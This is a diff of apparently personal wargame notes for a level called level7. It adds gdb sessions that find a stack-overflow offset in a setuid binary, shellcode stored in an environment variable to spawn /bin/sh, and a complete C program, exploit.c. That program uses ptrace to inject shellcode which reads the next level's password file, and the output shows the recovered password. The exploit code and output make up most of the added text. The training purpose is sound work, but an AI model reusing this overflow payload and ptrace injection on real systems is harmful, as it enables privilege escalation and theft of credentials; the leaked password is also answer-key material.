@@ -9,11 +9,12 @@ Dump of assembler code for function main:
 0x0804846f <main+11>:   mov    %esp,%ebp
 0x08048471 <main+13>:   push   %edi
 0x08048472 <main+14>:   push   %ecx
-0x08048473 <main+15>:   sub    $0x410,%esp
+0x08048473 <main+15>:   sub    $0x410,%esp  /*0x410 = 1040 */
 0x08048479 <main+21>:   mov    %ecx,0xfffffc04(%ebp)
 0x0804847f <main+27>:   mov    0xfffffc04(%ebp),%eax
 0x08048485 <main+33>:   cmpl   $0x2,(%eax)   /* %eax = &argc */
 0x08048488 <main+36>:   je     0x80484b1 <main+77>
+
 0x0804848a <main+38>:   mov    0xfffffc04(%ebp),%edx
 0x08048490 <main+44>:   mov    0x4(%edx),%eax
 0x08048493 <main+47>:   mov    (%eax),%eax
@@ -110,3 +111,193 @@ AAAA[00000024][0000018b][00000000][0083ecd8]
 [41414141][3830255b]
 
 offset = 10
+
+
+r $(perl -e 'print "A"x(2000)."B"x(1000)')
+
+ r $(perl -e 'print "A"x(55730)')
+ (gdb) c
+Continuing.
+Walk the way of the 1337 one!AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...........
+Breakpoint 4, 0x080485a0 in main ()
+(gdb) x/x $esp
+0xbffefffc:     0x41414141
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+(gdb) 
+
+r $(perl -e 'print "A"x(772)."B"x(4)."C"x(224)."C"x(54730)') 
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+(gdb) 
+
+level7@blackbox:/tmp/level7$export PYALOAD=$'\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80'
+level7@blackbox:/tmp/level7$ /tmp/level7/getenv12 PAYLOAD
+PAYLOAD is at 0xbfffdfad
+
+level7@blackbox:/tmp/level7$ ./exploit $(perl -e 'print "A"x(772)."\xad\xdf\xff\xbf"."C"x(224)."C"x(54730)')
+Father process: child process pid = 9998
+Walk the way of the 1337 one!AAAAAAAAAAAAAAA.......
+CCCCCCCCCCCCCCCCCCtmp.esp = bfff0114,child will exit,write shellcode
+n0s3crets
+child exited
+level7@blackbox:/tmp/level7$ 
+
+
+exploit.c 
+
+#include <sys/ptrace.h>
+#include <sys/fcntl.h>
+#include <sys/user.h>
+#include <sys/wait.h>
+#include <signal.h>
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <errno.h>
+
+
+const int long_size = sizeof(long);
+void traphdl(int s) {
+  printf("TRAP caught.\n");
+}
+void childhdl(int s)
+{
+//   printf("SIGCHILD caught\n");
+}
+void getdata(pid_t child, long addr,
+             char *str, int len)
+{
+    char *laddr;
+    int i, j;
+    union u
+    {
+        long val;
+        char chars[long_size];
+    }data;
+
+    i = 0;
+    j = len / long_size;
+    laddr = str;
+
+    while(i < j)
+    {
+        data.val = ptrace(PTRACE_PEEKDATA, child, addr + i * 4, NULL);
+        memcpy(laddr, data.chars, long_size);
+        ++i;
+        laddr += long_size;
+    }
+    j = len % long_size;
+    if(j != 0)
+    {
+        data.val = ptrace(PTRACE_PEEKDATA, child, addr + i * 4, NULL);
+        memcpy(laddr, data.chars, j);
+    }
+    str[len] = '\0';
+}
+
+void putdata(pid_t child, long addr, char *str, int len)
+{
+    char *laddr;
+    int i, j;
+    union u
+    {
+        long val;
+        char chars[long_size];
+    }data;
+
+    i = 0;
+    j = len / long_size;
+    laddr = str;
+    while(i < j)
+    {
+        memcpy(data.chars, laddr, long_size);
+        ptrace(PTRACE_POKEDATA, child, addr + i * 4, data.val);
+        ++i;
+        laddr += long_size;
+    }
+    j = len % long_size;
+    if(j != 0)
+    {
+        memcpy(data.chars, laddr, j);
+        ptrace(PTRACE_POKEDATA, child, addr + i * 4, data.val);
+    }
+}
+
+
+int main(int argc, char **argv, char **environ) {
+  int f;
+  char parameter[500]={0};
+  char bak[1000] ={0};
+  char shellcode[] = "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x83\xec\x14\xeb\x32\x5b\xb0\x05\
+x31\xc9\xcd"
+"\x80\x89\xc6\xeb\x06\xb0\x01\x31"
+"\xdb\xcd\x80\x89\xf3\xb0\x03\x83"
+"\xec\x01\x8d\x0c\x24\xb2\x01\xcd"
+"\x80\x31\xdb\x39\xc3\x74\xe6\xb0"
+"\x04\xb3\x01\xb2\x01\xcd\x80\x83"
+"\xc4\x01\xeb\xdf\xe8\xc9\xff\xff"
+"\xff"
+"/home/level8/password\x00";
+  int sc_length = sizeof(shellcode);
+ // strncpy(parameter, argv[1], sizeof(parameter));
+  signal(SIGTRAP, traphdl);
+  signal(SIGCHLD, childhdl);
+  f = fork();
+  if (f == 0) {
+    char *X[3] = { "/home/level7/heybabe", argv[1], NULL };
+    //ptrace(PTRACE_TRACEME, 0, NULL, NULL);
+    int ret = execve(X[0], X, environ);
+    if(ret == -1)
+        perror("execve");
+    return 255;
+  }
+  else if (f > 0)
+  {
+     int pid = 0;
+     int status;
+     printf("Father process: child process pid = %d\n", f);
+     int mark = 0;
+     while (pid == 0 || errno != ECHILD) {
+         pid = wait(&status);
+         if(WIFEXITED(status))
+         {
+             printf("child exited\n");
+             return 0;
+         }
+      if (pid == f && WIFSTOPPED(status)) {
+        struct user_regs_struct U;
+        memset(&U, 0, sizeof(U));
+        errno = 0;
+        int ret = ptrace(PTRACE_GETREGS, f, 0, &U);
+        if (ret < 0)
+        {
+           printf("errno = %d",errno);
+           perror(errno);
+           return 1;
+        }
+      // printf("SYSCALL=%d\nEIP=%p; EBP=%p;ESP=%p;ESI=%d;EDI=%d;EAX=%d;EBX=%d;ECX=%d;EDX=%d\n",U.orig_eax, U.eip, U.ebp, U.esp, U.esi, U.edi, U.eax, U.ebx,U.ecx,U.edx);
+        if (mark == 0)
+        {
+           struct user_regs_struct tmp = U;
+           /* 重点： 利用ebp来设置正确的esp*/
+           tmp.esp = tmp.ebp - 20;
+           printf("tmp.esp = %x,child will exit,write shellcode\n", tmp.esp);
+           getdata(f, U.eip, bak,sc_length - 1);
+           putdata(f, U.eip, shellcode, sc_length - 1);
+           ptrace(PTRACE_SETREGS, f, NULL, &tmp);
+           mark++;
+        }
+        ptrace(PTRACE_SYSCALL, f, NULL, NULL);
+        //printf("***********************************\n");
+     }
+       }
+  return 0;
+}
+}
